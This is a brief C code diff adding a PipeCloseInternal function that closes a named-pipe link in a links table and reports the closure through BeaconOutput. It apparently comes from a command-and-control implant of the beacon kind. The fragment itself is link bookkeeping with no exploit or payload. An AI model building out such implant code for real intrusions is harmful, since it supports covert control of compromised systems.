@@ -151,3 +151,19 @@ void PipeReopen(char* buffer, int length)
 		}
 	}
 }
+
+void PipeCloseInternal(int bid)
+{
+	for (int i = 0; i < MAX_LINKS; i++)
+	{
+		if (gLinks[i].isOpen == TRUE && gLinks[i].bid == bid)
+		{
+			bid = htonl(bid);
+			BeaconOutput(CALLBACK_PIPE_CLOSE, (char*)&bid, sizeof(int));
+			gLinks[i].bid = 0;
+			gLinks[i].isOpen = FALSE;
+			gLinks[i].lastPingTime = 0;
+			break;
+		}
+	}
+}
